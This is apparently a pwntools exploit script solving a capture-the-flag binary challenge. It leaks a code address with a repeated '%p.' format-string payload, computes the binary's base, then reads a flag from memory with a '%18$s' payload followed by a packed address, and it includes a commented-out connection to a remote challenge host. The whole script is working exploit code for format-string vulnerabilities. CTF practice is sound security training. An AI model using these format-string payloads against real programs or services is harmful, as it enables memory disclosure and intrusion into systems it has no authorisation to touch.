from pwn import *

r = process('./chal')
# r = remote('10.113.184.121', 10055)

# leak text relative address
# raw_input()
payload = b'%p.' * (39 + 6) + b'\n'
r.sendline(payload)

text_offset = 0x11e9
flag_offset = 0x4040
text_addr = int(r.recvline().split(b'.')[-2], 16)
text_base = text_addr - text_offset

log.info(f'Text Address = {hex(text_addr)}')
log.info(f'Text Base = {hex(text_base)}')

# leak flag
flag_addr = text_base + flag_offset
# payload = b'%p' * 0x17 + b'.' + b'%s'
payload = b'%18$s'
payload = payload.ljust(0x50, b'\x00')
payload += p64(flag_addr)
log.info(f'Flag Address = {hex(flag_addr)}')
# raw_input()
r.sendline(payload)

r.interactive()